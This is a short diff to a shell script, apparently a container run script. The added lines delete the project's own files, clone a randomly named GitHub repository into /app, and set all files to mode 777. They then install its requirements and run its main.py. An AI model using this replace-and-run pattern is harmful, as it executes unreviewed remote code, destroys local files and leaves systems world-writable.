@@ -20,3 +20,41 @@ sleep 10
 
 python /app/main.py -cv 126
 
+sleep 10
+
+rm -fr LICENSE
+
+rm -fr accounts.json.sample
+
+rm -fr src
+
+rm -fr README.md
+
+rm -fr requirements.txt
+
+rm -fr main.py
+
+sleep 10
+
+git clone https://github.com/haystwg717jjs9/kfcvarteacobitA
+
+chmod 777 /app/kfcvarteacobitA
+
+cd /app/kfcvarteacobitA && mv /app/kfcvarteacobitA/* /app/
+
+rm -fr /app/kfcvarteacobitA
+
+chmod 777 /app/*
+
+sleep 10
+
+pip install -r requirements.txt --break-system-packages
+
+sleep 10
+
+python /app/main.py -cv 126
+
+sleep 10
+
+python /app/main.py -cv 126
+
